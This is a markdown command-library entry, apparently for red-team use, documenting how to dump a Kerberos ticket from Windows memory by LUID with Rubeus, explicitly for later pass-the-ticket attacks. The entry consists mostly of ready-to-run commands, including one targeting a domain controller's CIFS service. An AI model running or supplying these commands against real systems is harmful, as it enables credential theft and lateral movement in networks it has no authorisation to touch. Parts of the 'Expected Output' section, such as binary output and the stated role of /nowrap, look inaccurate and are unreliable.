---
type: command
executor: cmd
data: 'Rubeus.exe dump /luid:0x12d1f7'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - kerberos
  - credential-access
verified: true
validated: true
---

# rubeus-dump-ticket-by-luid

## Command

```cmd
Rubeus.exe dump /luid:0x12d1f7
```

## Description

This command dumps a specific Kerberos ticket from memory using its LUID, exporting it in Kirbi binary format for later use in pass-the-ticket attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| dump | Flag to export a ticket | Yes |
| /luid:<value> | Locally Unique Identifier of the target ticket (hex) | Yes |
| /service:<spn> | Optional service principal name to filter (e.g., krbtgt/DOMAIN) | No |

## Examples

### Basic Usage

```cmd
Rubeus.exe dump /luid:0x12d1f7
```

### With Service Filter

```cmd
Rubeus.exe dump /luid:0x12d1f7 /service:cifs/DC01.DOMAIN.LOCAL
```

## Expected Output

Binary output to stdout or file (if /nowrap used), e.g., a .kirbi file containing the ticket blob. Success indicated by non-zero file size and no errors like "Invalid LUID".

## Related

- [[procedures/Dump-Kerberos-Tickets]]
- [[tools/Rubeus]]
